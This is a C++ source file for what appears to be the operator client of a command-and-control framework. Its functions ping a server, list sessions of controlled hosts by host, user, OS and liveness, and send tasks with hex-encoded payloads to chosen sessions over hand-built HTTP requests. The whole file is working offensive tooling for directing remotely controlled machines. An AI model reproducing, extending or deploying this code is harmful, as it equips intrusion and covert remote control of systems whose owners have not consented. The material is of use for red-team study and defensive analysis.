#include "protocol.h"
#include <cstring>

#if defined(_WIN32)
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
using socklen_t_t = int;
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>
using socklen_t_t = socklen_t;
#endif

namespace opcli {

static void CloseSock(int s) {
#if defined(_WIN32)
    closesocket(s);
#else
    ::close(s);
#endif
}

C2Client::C2Client(std::string base) : base_(std::move(base)) {}

bool C2Client::Post(const std::string& path, const std::string& body, std::string& resp) {
    std::string host = "127.0.0.1";
    int port = 8443;
    size_t p = base_.find("://");
    std::string strip = p == std::string::npos ? base_ : base_.substr(p + 3);
    size_t colon = strip.find(':');
    if (colon != std::string::npos) {
        host = strip.substr(0, colon);
        try { port = std::stoi(strip.substr(colon + 1)); } catch (...) {}
    } else host = strip;

    int s = (int)::socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return false;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(uint16_t(port));
    if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) != 1) { CloseSock(s); return false; }
    if (::connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) { CloseSock(s); return false; }

    std::string req = "POST " + path + " HTTP/1.1\r\nHost: " + host +
                      "\r\nContent-Type: application/json\r\nContent-Length: " +
                      std::to_string(body.size()) + "\r\nConnection: close\r\n\r\n" + body;
    ::send(s, req.data(), int(req.size()), 0);

    char buf[8192];
    int n;
    while ((n = ::recv(s, buf, sizeof(buf), 0)) > 0) resp.append(buf, n);
    CloseSock(s);
    return !resp.empty() && resp.find("200") != std::string::npos;
}

bool C2Client::Ping() {
    std::string r;
    return Post("/op/ping", "{}", r);
}

bool C2Client::Sessions(std::vector<SessionInfo>& out) {
    std::string r;
    if (!Post("/op/sessions", "{}", r)) return false;
    size_t bstart = r.find("\r\n\r\n");
    std::string body = bstart == std::string::npos ? r : r.substr(bstart + 4);
    size_t p = 0;
    while ((p = body.find('{', p)) != std::string::npos) {
        size_t e = body.find('}', p);
        if (e == std::string::npos) break;
        std::string obj = body.substr(p, e - p + 1);
        auto field = [&](const char* k) -> std::string {
            std::string pat = "\"" + std::string(k) + "\":\"";
            size_t q = obj.find(pat);
            if (q == std::string::npos) return {};
            q += pat.size();
            size_t z = obj.find('"', q);
            return z == std::string::npos ? std::string{} : obj.substr(q, z - q);
        };
        SessionInfo si;
        si.id   = field("id");
        si.host = field("host");
        si.user = field("user");
        si.os   = field("os");
        si.alive = obj.find("\"alive\":true") != std::string::npos;
        if (!si.id.empty()) out.push_back(std::move(si));
        p = e + 1;
    }
    return true;
}

bool C2Client::Task(const std::string& sid, int op, const std::vector<uint8_t>& payload) {
    static const char* hex = "0123456789abcdef";
    std::string ph;
    ph.reserve(payload.size() * 2);
    for (uint8_t c : payload) { ph.push_back(hex[c >> 4]); ph.push_back(hex[c & 0xF]); }
    std::string body = "{\"sid\":\"" + sid + "\",\"op\":" + std::to_string(op) +
                       ",\"payload\":\"" + ph + "\"}";
    std::string r;
    return Post("/op/task", body, r);
}

}